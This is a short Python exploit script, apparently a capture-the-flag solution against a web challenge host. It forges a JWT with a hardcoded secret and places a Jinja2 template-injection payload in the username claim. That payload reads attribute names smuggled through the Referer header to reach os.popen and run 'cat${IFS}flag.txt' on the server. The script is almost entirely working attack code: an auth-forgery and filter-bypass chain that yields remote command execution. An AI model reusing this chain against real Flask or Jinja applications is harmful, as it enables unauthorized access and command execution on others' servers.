  #!/usr/bin/env python3
import jwt
import requests
from bs4 import BeautifulSoup

secret_key = 'torontobluejays'
username = """
{{lipsum|attr(request.referrer.split().pop(0))|attr(request.referrer.split().pop(1))(request.referrer.split().pop(2))|attr(request.referrer.split().pop(3))(request.referrer.split().pop(4))|attr(request.referrer.split().pop(5))()}}
"""
pay = """__globals__ __getitem__ os popen cat${IFS}flag.txt read """


def genJWT(username):
    payload = {
        "username": username,
}
    token = jwt.encode(payload, secret_key, algorithm='HS256')
    return token


jwt_token = genJWT(username)
print(jwt_token)

url = "https://uoftctf-my-first-app.chals.io:443/?test="
cookies = {"auth_token": jwt_token}

headers = {"referer": pay}
response = requests.get(url,headers=headers, cookies=cookies)
#response = requests.get(url,headers=headers, cookies=cookies, proxies=proxies)
cont = response.text


s = BeautifulSoup(cont, 'html.parser')
cov = s.find('div', class_='container')

if cov:
    print(cov.prettify())
else:
    print(cont)
